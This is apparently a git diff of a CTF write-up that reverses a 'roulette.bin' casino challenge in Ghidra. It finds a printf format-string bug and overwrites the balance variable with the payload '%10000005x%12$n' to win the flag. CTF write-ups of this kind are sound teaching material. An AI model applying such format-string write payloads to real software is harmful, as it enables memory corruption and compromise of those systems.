@@ -3,7 +3,7 @@
 
 ![](images/roulette.png)
 
-Lets check file type:
+First Lets check the file type:
 ```console
 file roulette.bin 
 roulette.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ed7615410ce361d0fb60d7718bc23c478a0b0e57, for GNU/Linux 3.2.0, not stripped
@@ -24,7 +24,7 @@ The house always wins... Bye!
 
 ```
 
-Look betting  game ,let open the file in ghidra an take a look on main function:
+Looks like its betting game ,let open the file in ghidra an take a look on main function:
 ```c
 undefined8 main(void)
 
@@ -138,8 +138,7 @@ LAB_00101588:
 ```
 
 
-so we can see that we need that the if [local_28] will be bigger than
-10000000
+So we can see that `[local_28]` should be bigger than 10000000
 ```c
 if (10000000 < (int)*local_28) {
             free(local_28);
@@ -148,7 +147,8 @@ if (10000000 < (int)*local_28) {
             return 0;
           }
 ```
-we also see something  suspicions:
+
+We can see in this block somthing suspicous `printf(local_18);`
 ```c
 local_18 = (char *)malloc(0x40); //malloc
             sVar2 = read(0,local_18,0x40); //read from sdt_input
@@ -162,8 +162,8 @@ local_18 = (char *)malloc(0x40); //malloc
 ```
 
 Look like we have `format vulnerability`.
-we have some steps to get to the read from std input:
-1.need to pass game numbers check -    input range(-1) - 2 
+In order to get to get into the vulnerabilty block code we need to do number of steps:
+1.Need to pass game numbers check -    input range(-1) - 2 
 ```c
 iVar1 = __isoc99_scanf(&DAT_00102090,&local_48);
   if (iVar1 == 1) {
@@ -172,14 +172,14 @@ iVar1 = __isoc99_scanf(&DAT_00102090,&local_48);
       local_c = 0;
       while ((ulong)(long)local_c < local_48) {
 ```
-2. enter bet between 1-36 - need to enter somthing specific
+2. Enter bet between 1-36 - need to enter somthing specific
 ```c
 if (((int)local_4c < 1) || (0x24 < (int)local_4c)) {
           if (local_4c == 0x31519) {
 ```
 0x31519 = 202009
 
-let's try it:
+Now let's try it:
 ```console
 matan@matan:~/Documents/hacking/matrix2021$ ./roulette.bin 
 Welcome to Casino Royal
@@ -194,8 +194,8 @@ Please enter your command (it will be printed to make sure you entered the right
 ```
 
 so we should check where is the `local_28` can be found on the stack in order to build buffer to override the value of [local_28].
- let put break on  and see what is the value of local_28 and how the stack look like:
- ```
+ let put break on 0x555555555564 and see what is the value of local_28 and how the stack look like:
+```
  0x555555555564 <main+883>    call   free@plt <free@plt>
 ```
 
@@ -216,9 +216,7 @@ Stack
 07:0038│      0x7fffffffdf18 ◂— 0x0
 ```
 
-we can see that local 28 is in sixth place -in the format who be in location 12.
-
-so our buffer should look like:
+We can see that local 28 is in sixth place - in the format attack it will be in location 12. so our buffer should look like:
 `%10000005x%12$n`
 
 Now let run it:
@@ -236,4 +234,4 @@ Please enter your command (it will be printed to make sure you entered the right
 . . .
 You Won!
  The Flag is: MCL{I_HOPE_###################}
- ```
+```
